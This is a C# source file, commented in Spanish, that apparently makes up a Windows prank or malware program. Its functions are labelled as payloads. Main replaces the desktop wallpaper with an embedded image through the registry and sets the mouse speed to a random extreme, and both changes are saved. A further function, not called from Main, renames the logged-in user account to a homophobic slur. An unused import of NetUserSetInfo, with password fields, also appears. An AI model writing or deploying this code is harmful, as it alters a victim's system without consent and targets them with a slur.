using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.IO;
using Microsoft.Win32;
using System.DirectoryServices;

namespace Kenose
{
    public static class Principal
    {
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, IntPtr lpvParam, int fuWinIni); //método WINAPI para cambiar fondo pantalla
        [DllImport("netapi32.dll", CharSet = CharSet.Unicode)]
        static extern int NetUserSetInfo(
            string servername,
            string username,
            int level,
            ref USER_INFO_1 buf,
            out UInt32 parm_err
            ); //from pinvoke.net
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct USER_INFO_1
        {
            [MarshalAs(UnmanagedType.LPWStr)] public string sUsername;
            [MarshalAs(UnmanagedType.LPWStr)] public string sPassword;
            public uint uiPasswordAge;
            public uint uiPriv;
            [MarshalAs(UnmanagedType.LPWStr)] public string sHome_Dir;
            [MarshalAs(UnmanagedType.LPWStr)] public string sComment;
            public uint uiFlags;
            [MarshalAs(UnmanagedType.LPWStr)] public string sScript_Path;
        }
        const int SPI_SETDESKWALLPAPER = 0x0014;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;
        const int SPI_SETMOUSESPEED = 0x0071;
        private static void CambiarFondo() //payload 1 -> cambiar fondo de pantalla
        {
            string temp = Path.GetTempPath() + "fondo.jpg";
            Kenose.Properties.Resources.fondo.Save(temp); //guardar el fondo en una localización temporal
            RegistryKey key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop", true); //stretch
            key.SetValue(@"WallpaperStyle", 2.ToString());
            key.SetValue(@"TileWallpaper", 0.ToString());
            IntPtr str = Marshal.StringToHGlobalUni(temp);
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, str, SPIF_SENDWININICHANGE | SPIF_UPDATEINIFILE); //aplicar cambio de fondo
        }
        public static void CambiarUser()
        {
            using(DirectoryEntry AD = new DirectoryEntry("WinNT://"+Environment.MachineName + ",computer"))
            {
                using(DirectoryEntry NewUser = AD.Children.Find(Environment.UserName,"user"))
                {
                    if(NewUser != null)
                    {
                        NewUser.Rename("Faggot");
                    }
                }
            }
        }
        public static void CambiarVelocidadRaton()
        {
            int err;
            Random random = new Random();
            if(random.NextDouble() > 0.5f)
            {
                IntPtr num = new IntPtr(1);
                err = SystemParametersInfo(SPI_SETMOUSESPEED, 0, num, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
            else
            {
                IntPtr num = new IntPtr(20);
                err = SystemParametersInfo(SPI_SETMOUSESPEED, 0, num, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
            }
        }
        public static void Main(string[] args)
        {
            CambiarFondo();
            CambiarVelocidadRaton();
        }
    }
}
